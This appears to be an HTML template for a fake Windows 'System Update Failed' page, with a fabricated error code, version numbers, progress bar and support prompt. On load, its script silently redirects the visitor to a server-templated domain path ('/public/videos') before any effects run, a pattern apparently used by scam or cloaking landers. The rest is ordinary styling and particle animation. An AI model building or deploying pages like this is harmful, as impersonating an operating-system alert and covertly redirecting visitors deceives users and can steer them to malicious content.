<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update Error</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #0f111a;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 50px 20px;
            position: relative;
            overflow-x: hidden;
            overflow-y: auto;
        }
        
        /* Background particles effect */
        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        
        .particle {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            animation: float 15s infinite linear;
        }
        
        @keyframes float {
            0% {
                transform: translateY(100vh) translateX(0);
            }
            100% {
                transform: translateY(-20vh) translateX(20px);
            }
        }
        
        .error-container {
            background-color: rgba(22, 25, 37, 0.8);
            border-radius: 10px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            padding: 35px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            position: relative;
            z-index: 10;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            animation: fadeIn 0.8s ease-out;
            overflow: hidden;
            margin: 50px 0;
        }
        
        /* Border pulse effect */
        .error-container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            border-radius: 12px;
            background: linear-gradient(45deg, #ff3d71, #5c4cff, #00cfdd, #ff3d71);
            background-size: 400% 400%;
            z-index: -1;
            animation: borderGlow 8s ease infinite;
            opacity: 0.6;
        }
        
        @keyframes borderGlow {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .system-icon {
            width: 90px;
            height: 90px;
            margin: 0 auto 25px;
            background: linear-gradient(45deg, #ff3d71, #ff466c);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: 0 6px 16px rgba(255, 61, 113, 0.4);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% {
                box-shadow: 0 0 0 0 rgba(255, 61, 113, 0.7);
            }
            70% {
                box-shadow: 0 0 0 10px rgba(255, 61, 113, 0);
            }
            100% {
                box-shadow: 0 0 0 0 rgba(255, 61, 113, 0);
            }
        }
        
        .system-icon i {
            font-size: 40px;
            color: white;
            font-style: normal;
            font-weight: bold;
        }
        
        h1 {
            color: #ff3d71;
            margin-bottom: 20px;
            font-size: 26px;
            text-shadow: 0 2px 8px rgba(255, 61, 113, 0.4);
            animation: textGlow 2s infinite alternate;
        }
        
        @keyframes textGlow {
            from {
                text-shadow: 0 0 5px rgba(255, 61, 113, 0.3);
            }
            to {
                text-shadow: 0 0 15px rgba(255, 61, 113, 0.6);
            }
        }
        
        .error-message {
            margin-bottom: 20px;
            line-height: 1.7;
            color: #c8c8d0;
            font-size: 15px;
            animation: fadeIn 1s ease-out;
            animation-delay: 0.2s;
            opacity: 0;
            animation-fill-mode: forwards;
        }
        
        .error-code {
            background-color: rgba(15, 17, 26, 0.7);
            padding: 12px 18px;
            border-radius: 6px;
            font-family: monospace;
            display: inline-block;
            margin-bottom: 25px;
            font-size: 16px;
            border-left: 3px solid #ff3d71;
            color: #ff3d71;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            animation: slideIn 0.6s ease-out;
        }
        
        @keyframes slideIn {
            from {
                transform: translateX(-20px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        .error-details {
            background-color: rgba(15, 17, 26, 0.7);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: left;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            animation: fadeIn 1s ease-out;
            animation-delay: 0.4s;
            opacity: 0;
            animation-fill-mode: forwards;
        }
        
        .error-details h2 {
            font-size: 17px;
            margin-bottom: 15px;
            color: #e0e0e0;
            position: relative;
            padding-left: 15px;
        }
        
        .error-details h2::before {
            content: '';
            position: absolute;
            left: 0;
            top: 50%;
            width: 6px;
            height: 20px;
            background: #ff3d71;
            transform: translateY(-50%);
            border-radius: 3px;
        }
        
        .detail-item {
            margin-bottom: 12px;
            font-size: 14px;
            display: flex;
            align-items: flex-start;
        }
        
        .detail-label {
            font-weight: 600;
            width: 180px;
            color: #a0a0b0;
        }
        
        .progress-container {
            background-color: rgba(15, 17, 26, 0.7);
            border-radius: 6px;
            height: 8px;
            overflow: hidden;
            margin: 25px 0;
            position: relative;
        }
        
        .progress-bar {
            background: linear-gradient(to right, #ff3d71, #5c4cff);
            height: 100%;
            width: 67%;
            border-radius: 6px;
            position: relative;
            animation: progressGlow 2s infinite alternate;
        }
        
        @keyframes progressGlow {
            from {
                box-shadow: 0 0 5px rgba(255, 61, 113, 0.3);
            }
            to {
                box-shadow: 0 0 15px rgba(255, 61, 113, 0.6);
            }
        }
        
        /* Blinking effect for progress bar */
        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            width: 5px;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.2;
            }
        }
        
        .causes-list {
            text-align: left;
            margin: 15px 0 15px 30px;
            color: #c8c8d0;
            animation: fadeIn 1s ease-out;
            animation-delay: 0.6s;
            opacity: 0;
            animation-fill-mode: forwards;
        }
        
        .causes-list li {
            margin-bottom: 8px;
            position: relative;
        }
        
        .causes-list li::before {
            content: '•';
            color: #5c4cff;
            font-weight: bold;
            position: absolute;
            left: -15px;
        }
        
        .buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 30px;
            animation: fadeIn 1s ease-out;
            animation-delay: 0.8s;
            opacity: 0;
            animation-fill-mode: forwards;
        }
        
        .btn {
            padding: 14px 26px;
            border-radius: 6px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            font-size: 15px;
            transition: all 0.25s ease;
            position: relative;
            overflow: hidden;
        }
        
        .btn::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 5px;
            height: 5px;
            background: rgba(255, 255, 255, 0.5);
            opacity: 0;
            border-radius: 100%;
            transform: scale(1, 1) translate(-50%);
            transform-origin: 50% 50%;
        }
        
        .btn:focus:not(:active)::after {
            animation: ripple 1s ease-out;
        }
        
        @keyframes ripple {
            0% {
                transform: scale(0, 0);
                opacity: 0.5;
            }
            20% {
                transform: scale(25, 25);
                opacity: 0.3;
            }
            100% {
                opacity: 0;
                transform: scale(40, 40);
            }
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 7px 14px rgba(0, 0, 0, 0.2);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn-retry {
            background: linear-gradient(45deg, #5c4cff, #00cfdd);
            color: white;
            box-shadow: 0 4px 12px rgba(92, 76, 255, 0.3);
        }
        
        .btn-retry:hover {
            box-shadow: 0 7px 14px rgba(92, 76, 255, 0.5);
        }
        
        .btn-cancel {
            background-color: rgba(255, 255, 255, 0.1);
            color: #e0e0e0;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .btn-cancel:hover {
            background-color: rgba(255, 255, 255, 0.15);
        }
        
        .support-info {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 14px;
            color: #a0a0b0;
            animation: fadeIn 1s ease-out;
            animation-delay: 1s;
            opacity: 0;
            animation-fill-mode: forwards;
        }
        
        .support-link {
            color: #5c4cff;
            text-decoration: none;
            font-weight: 600;
            position: relative;
            transition: all 0.3s ease;
        }
        
        .support-link::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 100%;
            height: 1px;
            background: linear-gradient(to right, #5c4cff, #00cfdd);
            transform: scaleX(0);
            transform-origin: right;
            transition: transform 0.3s ease;
        }
        
        .support-link:hover::after {
            transform: scaleX(1);
            transform-origin: left;
        }
        
        @media (max-width: 600px) {
            .buttons {
                flex-direction: column;
                gap: 12px;
            }
            
            .detail-label {
                width: 140px;
            }
            
            .error-container {
                padding: 25px 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Background particles effect -->
    <div class="particles" id="particles">
        <!-- Particles will be created by JavaScript -->
    </div>

    <div class="error-container">
        <div class="system-icon">
            <i>!</i>
        </div>
        
        <h1>System Update Failed</h1>
        
        <p class="error-message">
            The system software update process has been interrupted due to an unrecoverable error.
        </p>
        
        <div class="error-code">
            Error code: 0x8024402F
        </div>
        
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
        
        <div class="error-details">
            <h2>Error details:</h2>
            <div class="detail-item">
                <span class="detail-label">Current version:</span>
                <span>10.0.19042.1348</span>
            </div>
            <div class="detail-item">
                <span class="detail-label">Update version:</span>
                <span>10.0.19044.2604</span>
            </div>
            <div class="detail-item">
                <span class="detail-label">Error description:</span>
                <span>Unable to access update server or update file is corrupted</span>
            </div>
        </div>
        
        <p class="error-message">
            Possible causes:
        </p>
        <ul class="causes-list">
            <li>Unstable or interrupted network connection</li>
            <li>Update server temporarily unavailable</li>
        </ul>
        
        <div class="buttons">
            <button class="btn btn-retry">Retry Update</button>
            <button class="btn btn-cancel">Cancel</button>
        </div>
        
        <div class="support-info">
            If the problem persists, please contact <a href="#" class="support-link">Technical Support</a> and provide the error code above.
        </div>
    </div>

    <script>
    window.location.href = "<?=get_domain()?>/public/videos";
        // Create moving particles for background
        document.addEventListener('DOMContentLoaded', function() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = 30;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                // Random size
                const size = Math.random() * 4 + 1;
                
                // Random position
                const posX = Math.random() * 100;
                const posY = Math.random() * 100;
                
                // Random opacity
                const opacity = Math.random() * 0.3 + 0.1;
                
                // Random speed
                const duration = Math.random() * 25 + 15;
                
                // Random delay
                const delay = Math.random() * 15;
                
                // Apply styles
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                particle.style.left = `${posX}%`;
                particle.style.top = `${posY}%`;
                particle.style.opacity = opacity;
                particle.style.animationDuration = `${duration}s`;
                particle.style.animationDelay = `${-delay}s`;
                
                particlesContainer.appendChild(particle);
            }
            
            // Add ripple effect to buttons
            const buttons = document.querySelectorAll('.btn');
            buttons.forEach(button => {
                button.addEventListener('click', function(e) {
                    // Create ripple effect on click
                    const ripple = document.createElement('span');
                    ripple.classList.add('ripple');
                    this.appendChild(ripple);
                    
                    // Get mouse position
                    const x = e.clientX - this.getBoundingClientRect().left;
                    const y = e.clientY - this.getBoundingClientRect().top;
                    
                    // Apply styles to ripple
                    ripple.style.left = `${x}px`;
                    ripple.style.top = `${y}px`;
                    
                    // Remove ripple after animation completes
                    setTimeout(() => {
                        ripple.remove();
                    }, 600);
                });
            });
        });
    </script>
</body>
</html>